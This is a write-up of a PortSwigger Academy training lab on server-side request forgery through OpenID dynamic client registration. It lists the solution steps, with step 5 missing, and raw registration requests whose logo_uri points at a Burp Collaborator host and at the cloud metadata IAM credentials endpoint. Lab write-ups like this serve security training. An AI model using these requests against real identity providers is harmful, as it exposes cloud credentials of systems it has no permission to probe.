# Lab: SSRF via OpenID dynamic client registration

**Official PortSwigger URL:** https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration

**Lab idea:** The OAuth service supports dynamic client registration and uses client-specific metadata in an unsafe way, potentially causing server-side requests to unintended destinations. The challenge practices identifying SSRF risk in OpenID Connect registration features and their handling of supplied metadata.

## Vulnerability in brief
OAuth is a framework for delegated access; applications also use OAuth flows to sign users in through an identity held by another service. This Academy section is a **vulnerability topic**, not a general learning or testing category. It focuses on security failures in OAuth-based authentication and related OpenID Connect implementations.

## Solution idea
1. While proxying traffic through Burp, log in to your own account.
2. In Burp Repeater, create a suitable POST request to register your own client application with the OAuth service.
3. Send the request.
4. Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo.
- …
6. Send this request and copy the new client_id from the response.
7. Go back to the GET /client/CLIENT-ID/logo request and replace the client_id with the new one you just copied.
8. Use the "Submit solution" button to submit the access key and solve the lab.

## Payloads / key values
- `https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration`
- `/reg`
- `POST`
- `redirect_uris`
- `POST /reg HTTP/1.1 Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net Content-Type: application/json { "redirect_uris" : [ "https://example.com" ] }`
- `client_id`
- `/client/CLIENT-ID/logo`
- `logo_uri`
- `GET /client/CLIENT-ID/logo`
- `POST /reg`
- `POST /reg HTTP/1.1 Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net Content-Type: application/json { "redirect_uris" : [ "https://example.com" ], "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN" }`
- `CLIENT-ID`
- `"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"`

## Official source
- [PortSwigger Academy: Lab: SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)
